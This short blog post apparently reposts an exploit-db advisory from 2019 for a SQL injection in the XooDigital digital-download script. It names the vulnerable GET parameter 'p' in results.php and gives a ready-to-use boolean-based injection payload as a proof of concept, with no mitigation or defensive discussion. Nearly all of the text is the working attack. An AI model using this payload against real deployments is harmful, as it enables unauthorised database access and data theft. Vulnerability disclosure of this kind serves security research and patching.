---
layout:     post
title:      "XooDigital - 'p' SQL Injection"
date:       2019-03-26 12:02
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: XooDigital - 'p' SQL Injection
# Date: 26.03.2019
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://xooscripts.com/product/digital-download-protection-script.html
# Demo Site: http://xooscripts.com/demos/xoodigital/
# Version: Lastest
# Tested on: Kali Linux
# CVE: N/A

----- PoC : SQLi -----

Request: http://localhost/[PATH]/results.php?p=1
Vulnerable Parameter: p (GET)
Payload: p=1') OR NOT 7970=7970#
